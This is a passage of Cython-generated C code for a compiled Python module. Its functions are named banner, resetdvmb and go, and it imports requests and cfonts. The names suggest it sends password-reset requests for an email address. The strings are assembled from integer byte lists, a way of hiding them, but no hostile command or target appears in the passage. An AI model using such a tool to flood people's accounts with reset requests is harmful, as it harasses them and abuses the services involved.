  __Pyx_GIVEREF(__pyx_tuple__7);
  __pyx_codeobj__8 = (PyObject*)__Pyx_PyCode_New(1, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__7, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_init, 23, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__8)) __PYX_ERR(0, 23, __pyx_L1_error)

  
  __pyx_tuple__9 = PyTuple_Pack(2, __pyx_n_s_self, __pyx_n_s_textt); if (unlikely(!__pyx_tuple__9)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__9);
  __Pyx_GIVEREF(__pyx_tuple__9);
  __pyx_codeobj__10 = (PyObject*)__Pyx_PyCode_New(1, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__9, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_banner, 51, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__10)) __PYX_ERR(0, 51, __pyx_L1_error)

  
  __pyx_tuple__11 = PyTuple_Pack(7, __pyx_n_s_self, __pyx_n_s_email, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_json_resp, __pyx_n_s_status_text, __pyx_n_s_e); if (unlikely(!__pyx_tuple__11)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__11);
  __Pyx_GIVEREF(__pyx_tuple__11);
  __pyx_codeobj__12 = (PyObject*)__Pyx_PyCode_New(2, 0, 7, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__11, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_resetdvmb, 64, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__12)) __PYX_ERR(0, 64, __pyx_L1_error)

  
  __pyx_tuple__13 = PyTuple_Pack(2, __pyx_n_s_self, __pyx_n_s_email); if (unlikely(!__pyx_tuple__13)) __PYX_ERR(0, 90, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__13);
  __Pyx_GIVEREF(__pyx_tuple__13);
  __pyx_codeobj__14 = (PyObject*)__Pyx_PyCode_New(1, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__13, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_go, 90, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__14)) __PYX_ERR(0, 90, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_5 = PyInt_FromLong(5); if (unlikely(!__pyx_int_5)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_27 = PyInt_FromLong(27); if (unlikely(!__pyx_int_27)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_32 = PyInt_FromLong(32); if (unlikely(!__pyx_int_32)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_34 = PyInt_FromLong(34); if (unlikely(!__pyx_int_34)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_40 = PyInt_FromLong(40); if (unlikely(!__pyx_int_40)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_41 = PyInt_FromLong(41); if (unlikely(!__pyx_int_41)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_42 = PyInt_FromLong(42); if (unlikely(!__pyx_int_42)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_44 = PyInt_FromLong(44); if (unlikely(!__pyx_int_44)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_45 = PyInt_FromLong(45); if (unlikely(!__pyx_int_45)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_46 = PyInt_FromLong(46); if (unlikely(!__pyx_int_46)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_47 = PyInt_FromLong(47); if (unlikely(!__pyx_int_47)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_48 = PyInt_FromLong(48); if (unlikely(!__pyx_int_48)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_49 = PyInt_FromLong(49); if (unlikely(!__pyx_int_49)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_50 = PyInt_FromLong(50); if (unlikely(!__pyx_int_50)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_51 = PyInt_FromLong(51); if (unlikely(!__pyx_int_51)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_52 = PyInt_FromLong(52); if (unlikely(!__pyx_int_52)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_53 = PyInt_FromLong(53); if (unlikely(!__pyx_int_53)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_54 = PyInt_FromLong(54); if (unlikely(!__pyx_int_54)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_55 = PyInt_FromLong(55); if (unlikely(!__pyx_int_55)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_56 = PyInt_FromLong(56); if (unlikely(!__pyx_int_56)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_57 = PyInt_FromLong(57); if (unlikely(!__pyx_int_57)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_58 = PyInt_FromLong(58); if (unlikely(!__pyx_int_58)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_59 = PyInt_FromLong(59); if (unlikely(!__pyx_int_59)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_61 = PyInt_FromLong(61); if (unlikely(!__pyx_int_61)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_63 = PyInt_FromLong(63); if (unlikely(!__pyx_int_63)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_65 = PyInt_FromLong(65); if (unlikely(!__pyx_int_65)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_66 = PyInt_FromLong(66); if (unlikely(!__pyx_int_66)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_67 = PyInt_FromLong(67); if (unlikely(!__pyx_int_67)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_68 = PyInt_FromLong(68); if (unlikely(!__pyx_int_68)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_69 = PyInt_FromLong(69); if (unlikely(!__pyx_int_69)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_70 = PyInt_FromLong(70); if (unlikely(!__pyx_int_70)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_71 = PyInt_FromLong(71); if (unlikely(!__pyx_int_71)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_72 = PyInt_FromLong(72); if (unlikely(!__pyx_int_72)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_73 = PyInt_FromLong(73); if (unlikely(!__pyx_int_73)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_74 = PyInt_FromLong(74); if (unlikely(!__pyx_int_74)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_75 = PyInt_FromLong(75); if (unlikely(!__pyx_int_75)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_76 = PyInt_FromLong(76); if (unlikely(!__pyx_int_76)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_77 = PyInt_FromLong(77); if (unlikely(!__pyx_int_77)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_78 = PyInt_FromLong(78); if (unlikely(!__pyx_int_78)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_79 = PyInt_FromLong(79); if (unlikely(!__pyx_int_79)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_80 = PyInt_FromLong(80); if (unlikely(!__pyx_int_80)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_82 = PyInt_FromLong(82); if (unlikely(!__pyx_int_82)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_83 = PyInt_FromLong(83); if (unlikely(!__pyx_int_83)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_84 = PyInt_FromLong(84); if (unlikely(!__pyx_int_84)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_85 = PyInt_FromLong(85); if (unlikely(!__pyx_int_85)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_86 = PyInt_FromLong(86); if (unlikely(!__pyx_int_86)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_87 = PyInt_FromLong(87); if (unlikely(!__pyx_int_87)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_88 = PyInt_FromLong(88); if (unlikely(!__pyx_int_88)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_89 = PyInt_FromLong(89); if (unlikely(!__pyx_int_89)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_90 = PyInt_FromLong(90); if (unlikely(!__pyx_int_90)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_91 = PyInt_FromLong(91); if (unlikely(!__pyx_int_91)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_95 = PyInt_FromLong(95); if (unlikely(!__pyx_int_95)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_97 = PyInt_FromLong(97); if (unlikely(!__pyx_int_97)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_98 = PyInt_FromLong(98); if (unlikely(!__pyx_int_98)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_99 = PyInt_FromLong(99); if (unlikely(!__pyx_int_99)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_100 = PyInt_FromLong(100); if (unlikely(!__pyx_int_100)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_101 = PyInt_FromLong(101); if (unlikely(!__pyx_int_101)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_102 = PyInt_FromLong(102); if (unlikely(!__pyx_int_102)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_103 = PyInt_FromLong(103); if (unlikely(!__pyx_int_103)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_104 = PyInt_FromLong(104); if (unlikely(!__pyx_int_104)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_105 = PyInt_FromLong(105); if (unlikely(!__pyx_int_105)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_106 = PyInt_FromLong(106); if (unlikely(!__pyx_int_106)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_107 = PyInt_FromLong(107); if (unlikely(!__pyx_int_107)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_108 = PyInt_FromLong(108); if (unlikely(!__pyx_int_108)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_109 = PyInt_FromLong(109); if (unlikely(!__pyx_int_109)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_110 = PyInt_FromLong(110); if (unlikely(!__pyx_int_110)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_111 = PyInt_FromLong(111); if (unlikely(!__pyx_int_111)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_112 = PyInt_FromLong(112); if (unlikely(!__pyx_int_112)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_113 = PyInt_FromLong(113); if (unlikely(!__pyx_int_113)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_114 = PyInt_FromLong(114); if (unlikely(!__pyx_int_114)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_115 = PyInt_FromLong(115); if (unlikely(!__pyx_int_115)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_116 = PyInt_FromLong(116); if (unlikely(!__pyx_int_116)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_117 = PyInt_FromLong(117); if (unlikely(!__pyx_int_117)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_118 = PyInt_FromLong(118); if (unlikely(!__pyx_int_118)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_119 = PyInt_FromLong(119); if (unlikely(!__pyx_int_119)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_120 = PyInt_FromLong(120); if (unlikely(!__pyx_int_120)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_121 = PyInt_FromLong(121); if (unlikely(!__pyx_int_121)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_122 = PyInt_FromLong(122); if (unlikely(!__pyx_int_122)) __PYX_ERR(0, 4, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name_2, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_sleep);
  __Pyx_GIVEREF(__pyx_n_s_sleep);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_sleep);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_time, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_sleep); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sleep, __pyx_t_1) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_render);
  __Pyx_GIVEREF(__pyx_n_s_render);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_render);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_cfonts, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_render); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_render, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_27);
  __Pyx_GIVEREF(__pyx_int_27);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_27);
  __Pyx_INCREF(__pyx_int_91);
  __Pyx_GIVEREF(__pyx_int_91);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_91);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_109);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
